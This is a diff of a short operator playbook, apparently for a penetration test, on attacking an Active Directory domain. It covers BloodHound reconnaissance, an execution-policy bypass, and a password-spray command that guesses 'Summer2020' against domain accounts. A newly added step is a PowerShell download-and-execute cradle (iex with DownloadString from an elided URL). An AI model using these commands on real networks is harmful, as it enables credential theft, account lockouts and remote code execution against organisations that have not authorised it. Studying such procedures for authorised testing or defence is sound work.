@@ -8,9 +8,13 @@ Process:
 4. Could go and get Blood Hound / SharpHound, maybe collect some juicy details... 
 5. Assess the current situation before the sparay - try getlockoutinfo.ps1.
 6. Then attempt the PW spray with pwspray.ps1
+
 6.A. Need to open up a PowerShell prompt w/ bypass: from command prompt, "PowerShell -exec bypass" should get you there.
 6.B. Need to import the script - Type 'Import-Module pwspray.ps1', which is a more paranoid version of dafthack's pw spray script.
 6.C. Run the script - Invoke-DomainPasswordSpray -Password Summer2020 -OutFile results.txt
 6.D. Observe - Search-ADAccount –LockedOut. Problems? Use control C and punt. Wait a bunch before you try again. 
+
+7. Kick it up a notch: 
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://...')"
 
 
